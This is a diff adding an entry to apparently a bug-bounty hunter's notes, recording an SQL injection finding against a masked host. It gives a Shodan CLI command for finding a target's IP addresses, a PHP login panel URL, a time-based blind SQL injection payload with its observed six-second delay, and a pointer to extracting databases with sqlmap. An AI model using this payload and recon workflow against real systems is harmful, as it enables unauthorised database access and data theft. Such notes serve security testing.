@@ -71,5 +71,22 @@ Tried fetching other sensitive files like config.php.
 
 --------------------------------------------------------------------------------------------------------------
 
+Bug - SQL Injection
+
+finding ip address using shodan CLI
+
+shodan search Ssl.cert.subject.CN:"target.com" 200 --fields ip_str --limit 1000 | tee ips.txt
+
+https://54.xx.xxx.xx/ppp/logar.php
+
+PHP login panel
+Inject payload in login parameter 
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z ===> 6 sec delay 
+
+extract databases using sqlmap
+
+------------------------------------------------------------------------------------------------------------
+
+
 
 
